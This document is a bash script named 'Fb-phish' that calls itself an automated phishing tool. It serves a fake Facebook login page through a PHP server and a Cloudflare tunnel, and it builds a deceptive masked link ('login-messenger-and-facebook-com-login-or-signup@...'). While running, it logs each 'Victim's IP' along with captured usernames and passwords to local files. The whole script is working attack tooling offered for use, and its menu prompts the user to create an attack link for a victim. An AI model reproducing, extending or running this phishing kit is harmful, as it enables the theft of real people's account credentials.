#!/bin/bash

##   Fb-phish 	: 	Automated Phishing Tool
##   Author 	: 	MAMBA MENTALITY
##   Version 	: 	6.9
##   Github 	: 	https://github.com/mamba-9mm

## If you Copy Then Give the credits :)



##                   GNU GENERAL PUBLIC LICENSE
##                    Version 3, 29 June 2007
##
##    Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
##    Everyone is permitted to copy and distribute verbatim copies
##    of this license document, but changing it is not allowed.
##
##                         Preamble
##
##    The GNU General Public License is a free, copyleft license for
##    software and other kinds of works.
##
##    The licenses for most software and other practical works are designed
##    to take away your freedom to share and change the works.  By contrast,
##    the GNU General Public License is intended to guarantee your freedom to
##    share and change all versions of a program--to make sure it remains free
##    software for all its users.  We, the Free Software Foundation, use the
##    GNU General Public License for most of our software; it applies also to
##    any other work released this way by its authors.  You can apply it to
##    your programs, too.
##
##    When we speak of free software, we are referring to freedom, not
##    price.  Our General Public Licenses are designed to make sure that you
##    have the freedom to distribute copies of free software (and charge for
##    them if you wish), that you receive source code or can get it if you
##    want it, that you can change the software or use pieces of it in new
##    free programs, and that you know you can do these things.
##
##    To protect your rights, we need to prevent others from denying you
##    these rights or asking you to surrender the rights.  Therefore, you have
##    certain responsibilities if you distribute copies of the software, or if
##    you modify it: responsibilities to respect the freedom of others.
##
##    For example, if you distribute copies of such a program, whether
##    gratis or for a fee, you must pass on to the recipients the same
##    freedoms that you received.  You must make sure that they, too, receive
##    or can get the source code.  And you must show them these terms so they
##    know their rights.
##
##    Developers that use the GNU GPL protect your rights with two steps:
##    (1) assert copyright on the software, and (2) offer you this License
##    giving you legal permission to copy, distribute and/or modify it.
##
##    For the developers' and authors' protection, the GPL clearly explains
##    that there is no warranty for this free software.  For both users' and
##    authors' sake, the GPL requires that modified versions be marked as
##    changed, so that their problems will not be attributed erroneously to
##    authors of previous versions.
##
##    Some devices are designed to deny users access to install or run
##    modified versions of the software inside them, although the manufacturer
##    can do so.  This is fundamentally incompatible with the aim of
##    protecting users' freedom to change the software.  The systematic
##    pattern of such abuse occurs in the area of products for individuals to
##    use, which is precisely where it is most unacceptable.  Therefore, we
##    have designed this version of the GPL to prohibit the practice for those
##    products.  If such problems arise substantially in other domains, we
##    stand ready to extend this provision to those domains in future versions
##    of the GPL, as needed to protect the freedom of users.
##
##    Finally, every program is threatened constantly by software patents.
##    States should not allow patents to restrict development and use of
##    software on general-purpose computers, but in those that do, we wish to
##    avoid the special danger that patents applied to a free program could
##    make it effectively proprietary.  To prevent this, the GPL assures that
##    patents cannot be used to render the program non-free.
##
##    The precise terms and conditions for copying, distribution and
##    modification follow.
##
##      Copyright (C) 2023 MAMBA MENTALITY(https://github.com/mamba-9m
##


## ANSI colors (FG & BG)
RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"

## Directories
if [[ ! -d ".server" ]]; then
	mkdir -p ".server"
fi
if [[ -d ".server/www" ]]; then
	rm -rf ".server/www"
	mkdir -p ".server/www"
else
	mkdir -p ".server/www"
fi
if [[ -e ".cld.log" ]]; then
	rm -rf ".cld.log"
fi

## Script termination
exit_on_signal_SIGINT() {
    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
    exit 0
}

exit_on_signal_SIGTERM() {
    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1; reset_color; }
    exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

## Reset terminal colors
reset_color() {
	tput sgr0   # reset attributes
	tput op     # reset color
    return
}

## Kill already running process
kill_pid() {
	if [[ `pidof php` ]]; then
		killall php > /dev/null 2>&1
	fi
	if [[ `pidof cloudflared` ]]; then
		killall cloudflared > /dev/null 2>&1
	fi
}

## Banner
banner() {
	cat <<- EOF
		${ORANGE}        _                    _      _       _
		${ORANGE}       | |                  | |    (_)     | |  
		${ORANGE}   ____| |.__         _ __  | |__   _  ___ | |__   
		${ORANGE}  / ___| |_  \  ___  | '_ \ | '_ \ | |/ __|| '_ \   
		${ORANGE} | |___| |_) | |___| | |_) || | | || |\__ \| | | |  
		${ORANGE} | .___|_.__/        | .__/ |_| |_||_||___/|_| |_|   
		${ORANGE} | |                 | | 
		${ORANGE} |_|                 |_|        ${RED} Version : 6.9

		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by Mamba Mentality (mamba-9mm)${WHITE}
	EOF
	}
	
## Small Banner
banner_small() {
	cat <<- EOF
		${BLUE}
		${BLUE}███████╗██████╗░░░░░░░██████╗░██╗░░██╗██╗░██████╗██╗░░██╗
		${BLUE}██╔════╝██╔══██╗░░░░░░██╔══██╗██║░░██║██║██╔════╝██║░░██║
		${BLUE}█████╗░░██████╦╝█████╗██████╔╝███████║██║╚█████╗░███████║
		${BLUE}██╔══╝░░██╔══██╗╚════╝██╔═══╝░██╔══██║██║░╚═══██╗██╔══██║
		${BLUE}██║░░░░░██████╦╝░░░░░░██║░░░░░██║░░██║██║██████╔╝██║░░██║
		${BLUE}╚═╝░░░░░╚═════╝░░░░░░░╚═╝░░░░░╚═╝░░╚═╝╚═╝╚═════╝░╚═╝░░╚═╝${GREEN} Version 6.9
	EOF
	}

## Dependencies
dependencies() {
	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..."

    if [[ -d "/data/data/com.termux/files/home" ]]; then
        if [[ `command -v proot` ]]; then
            printf ''
        else
			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}proot${CYAN}"${WHITE}
            pkg install proot resolv-conf -y
        fi
    fi

	if [[ `command -v php` && `command -v wget` && `command -v curl` && `command -v unzip` ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Packages already installed."
	else
		pkgs=(php curl wget unzip)
		for pkg in "${pkgs[@]}"; do
			type -p "$pkg" &>/dev/null || {
				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
				if [[ `command -v pkg` ]]; then
					pkg install "$pkg" -y
				elif [[ `command -v apt` ]]; then
					apt install "$pkg" -y
				elif [[ `command -v apt-get` ]]; then
					apt-get install "$pkg" -y
				elif [[ `command -v pacman` ]]; then
					sudo pacman -S "$pkg" --noconfirm
				elif [[ `command -v dnf` ]]; then
					sudo dnf -y install "$pkg"
				else
					echo -e "\n${RED}[${WHITE}!${RED}]${RED} Unsupported package manager, Install packages manually."
					{ reset_color; exit 1; }
				fi
			}
		done
	fi

}

## Download Cloudflared
download_cloudflared() {
	url="$1"
	file=`basename $url`
	if [[ -e "$file" ]]; then
		rm -rf "$file"
	fi
	wget --no-check-certificate "$url" > /dev/null 2>&1
	if [[ -e "$file" ]]; then
		mv -f "$file" .server/cloudflared > /dev/null 2>&1
		chmod +x .server/cloudflared > /dev/null 2>&1
	else
		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured, Install Cloudflared manually."
		{ reset_color; exit 1; }
	fi
}

## Install Cloudflared
install_cloudflared() {
	if [[ -e ".server/cloudflared" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
		arch=`uname -m`
		case $arch in 
			arm | Android)
				download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm';;
			aarch64)
				download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64';;
			x86_64)
				download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64';;
			*)
				download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386';;
		esac
	fi
}

## Exit message
msg_exit() {
	{ clear; banner; echo; }
	echo -e "${GREENBG}${BLACK} Thank you for using my tool. Have a good day.${RESETBG}\n"
	{ reset_color; exit 0; }
}

## About
about() {
	{ clear; banner; echo; }
	cat <<- EOF
		${GREEN}Author   ${RED}:  ${ORANGE}MAMBA MENTALITY ${RED}[ ${ORANGE}MAMBA-9MM ${RED}]
		${GREEN}Github   ${RED}:  ${CYAN}https://github.com/mamba-9mm
		${GREEN}Social   ${RED}:  ${CYAN}https://facebook.com/mambamentality9mm
		${GREEN}Version  ${RED}:  ${ORANGE}6.9

		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in 
		99)
			msg_exit;;
		0 | 00)
			echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Returning to main menu..."
			{ sleep 1; main_menu; };;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; about; };;
	esac
}

## Setup website and start php server
HOST='127.0.0.1'
PORT='8080'

setup_site() {
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
	cp -rf .sites/"$website"/* .server/www
	cp -f .sites/ip.php .server/www/
	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
}

## Get IP address
capture_ip() {
	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
	IFS=$'\n'
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP : ${BLUE}$IP"
	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}ip.txt"
	cat .server/www/ip.txt >> ip.txt
}

## Get credentials
capture_creds() {
	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | cut -d " " -f2)
	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | cut -d ":" -f2)
	IFS=$'\n'
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}usernames.dat"
	cat .server/www/usernames.txt >> usernames.dat
	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
}

## Print data
capture_data() {
	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
	while true; do
		if [[ -e ".server/www/ip.txt" ]]; then
			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
			capture_ip
			rm -rf .server/www/ip.txt
		fi
		sleep 0.75
		if [[ -e ".server/www/usernames.txt" ]]; then
			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !!"
			capture_creds
			rm -rf .server/www/usernames.txt
		fi
		sleep 0.75
	done
}

## DON'T COPY PASTE WITHOUT CREDIT DUDE :')

## Start Cloudflared
start_cloudflared() { 
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	{ sleep 1; setup_site; }
	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."

    if [[ `command -v termux-chroot` ]]; then
		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
    else
        sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
    fi

	{ sleep 8; clear; banner_small; }
	
	cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cld.log")
	cldflr_link1=${cldflr_link#https://}
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$cldflr_link"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$cldflr_link1"
	capture_data
}

## Start localhost
start_localhost() {
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	setup_site
	{ sleep 1; clear; banner_small; }
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
	capture_data
}

## Tunnel selection
tunnel_menu() {
	{ clear; banner_small; }
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Localhost    ${RED}[${CYAN}For Devs${RED}]
		${RED}[${WHITE}02${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}NEW!${RED}]

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select a port forwarding service : ${BLUE}"

	case $REPLY in 
		1 | 01)
			start_localhost;;
		2 | 02)
			start_cloudflared;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; tunnel_menu; };;
	esac
}

## Facebook
site_facebook() {
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Facebook Fake Login Page

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in 
		1 | 01)
			website="facebook"
			mask='http://login-messenger-and-facebook-com-login-or-signup'
			tunnel_menu;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_facebook; };;

	esac
}

## Menu
main_menu() {
	{ clear; banner; echo; }
	cat <<- EOF
		${RED}[${WHITE}::${RED}]${ORANGE} Select Facebook to create an Attack Link For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}

		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      
		${RED}[${WHITE}02${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit

	EOF
	
	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in 
		1 | 01)
			site_facebook;;
		2)
			about;;
		0 | 00 )
			msg_exit;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; main_menu; };;
	esac
}
## Main
kill_pid
dependencies
install_cloudflared
main_menu
